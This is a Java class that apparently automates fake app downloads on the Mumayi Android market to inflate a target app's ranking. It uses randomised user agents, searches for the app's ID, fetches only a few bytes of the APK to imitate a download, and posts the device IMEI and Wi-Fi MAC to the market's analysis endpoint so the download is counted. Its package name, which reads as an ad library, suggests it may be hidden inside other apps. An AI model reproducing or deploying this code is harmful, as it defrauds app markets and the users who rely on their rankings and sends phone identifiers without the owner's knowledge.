package com.umeng.ad.app;

import java.net.URLEncoder;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;

import com.umeng.ad.app.u.TimeExtra;

class MarketMumayi extends Market {

	private String APP_ID = "";
	private String APP_DOWNLOAD_URL = "";

	private DeviceInfo deviceInfo;

	public MarketMumayi() {
	}

	public MarketMumayi(String packageName) {
		MARKET_NAME = MARKET_MUMAYI;
		setPackageName(packageName);
	}

	@Override
	protected boolean prepareToRank(Context context) throws Exception {
		deviceInfo = new DeviceInfo(context);
		deviceInfo.setUserAgent(u.randomAgent());
		int random = (int) (Math.random() * 100);
		if (APP_ID.isEmpty() || (random > 0 && random < 2)) {
			MLog.i("random = " + random + " appname = " + getAppKeyword()
					+ " app pkg = " + getPackageName());
			this.search(getAppKeyword(), getPackageName(), context);
		}
		this.downloadAPKPre();
		String reqData = String
				.format("id=%1$s&url=%2$s&xsession=&ximei=%3$s&xwifimac=%4$s&xchannel=m1001",
						APP_ID, APP_DOWNLOAD_URL, deviceInfo.imei,
						deviceInfo.wifiMac);
		return this.downloadAPK() && this.postAnalysis(reqData);
	}

	private void search(String appname, String pkg, Context context) {
		try {

			String url = "http://xmlso.mumayi.com/v16/search.php";
			String data = "type=mayi&q=" + URLEncoder.encode(appname)
					+ "&page=1&android=";

			MLog.i("tag url = " + url + " data = " + data);

			HttpPost httpPost = new HttpPost(url);
			/*
			 * http client
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params, 10 * 1000);
			HttpConnectionParams.setSoTimeout(params, 10 * 1000);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			client.setParams(params);

			try {

				httpPost.setHeader("Content-Type",
						"application/x-www-form-urlencoded");
				httpPost.setEntity(new StringEntity(data, HTTP.UTF_8));
				HttpResponse httpResponse = client.execute(httpPost);
				int code = httpResponse.getStatusLine().getStatusCode();
				if (code == 200) {
					String retSrc = EntityUtils.toString(httpResponse
							.getEntity());
					MLog.i("tag result = " + retSrc);
					/*
					 * get result and analyze
					 */
					JSONObject result;
					result = new JSONObject(retSrc);
					for (int i = 1; i < 16; i++) {
						JSONObject temp = result.getJSONObject("" + i);
						MLog.i("tag temp = " + temp);
						String appid = temp.getString("id");
						String pakage = temp.getString("packagename");
						MLog.i("tag appid = " + appid + " packagename = "
								+ pakage);
						if (pakage.equals(pkg)) {
							MLog.i("tag find appid = " + appid
									+ " packagename = " + pakage);
							APP_ID = appid;
							if (!appid.isEmpty()) {
								JSONArray keyArray = new JSONArray();
								keyArray.put("appId");
								JSONArray valueArray = new JSONArray();
								valueArray.put(APP_ID);
								super.updateMarketAppParams(context, keyArray,
										valueArray);
							}
							break;
						}
					}
				}

			} catch (Exception e) {
				MLog.i("tag Exception = " + e.getMessage());
				e.printStackTrace();
			}
		} catch (Exception e) {
		}
	}

	private void downloadAPKPre() {
		try {
			MLog.v("downloadAPKPre");
			/**
			 * data
			 */
			String url = "http://down.mumayi.com/" + APP_ID + "";

			HttpGet httpGet = new HttpGet(url);

			/**
			 * Logger.i(this,curlString);
			 */
			MLog.i(url);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("downloadPre status_code:" + code);
			Header[] headers2 = response.getAllHeaders();
			for (int i = 0; i < headers2.length; i++) {
				Header h = headers2[i];
				System.out
						.println("Header:" + h.getName() + "_" + h.getValue());
				if ("location".equals(h.getName().toLowerCase())) {
					APP_DOWNLOAD_URL = h.getValue();
					break;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private boolean downloadAPK() {
		try {
			MLog.v("downloadAPK:" + APP_DOWNLOAD_URL);
			/**
			 * data
			 */
			HttpGet httpGet = new HttpGet(APP_DOWNLOAD_URL);
			int range = ((int) (Math.random() * 300));
			MLog.i("range:" + range + "-" + (range + 2));
			httpGet.addHeader("Range", "bytes=" + range + "-" + (range + 2));
			httpGet.addHeader("Charset", "UTF-8");

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("download status_code:" + code);
			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.d("body:" + body);
			if (code == HttpStatus.SC_PARTIAL_CONTENT) {
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	/**
	 * 
	 */
	private boolean postAnalysis(String reqData) {
		try {
			MLog.v("postAnalysis");
			String url = "http://xmlso.mumayi.com/md5.php";
			HttpPost httpPost = new HttpPost(url);
			httpPost.addHeader("Content-Type",
					"application/x-www-form-urlencoded");

			StringEntity entity = new StringEntity(reqData, HTTP.UTF_8);
			httpPost.setEntity(entity);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params,
					"Apache-HttpClient/UNAVAILABLE (java 1.4)");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);

			int code = response.getStatusLine().getStatusCode();

			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.d("postData:" + code + "body:" + body);
			if (code == HttpStatus.SC_OK) {
				return true;
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	public String getAPP_ID() {
		return APP_ID;
	}

	public void setAPP_ID(String aPP_ID) {
		APP_ID = aPP_ID;
	}

	@Override
	protected void initAllParams() {
		try {
			setAPP_ID(params.get("a_appId"));
		} catch (Exception e) {
		}
	}

}
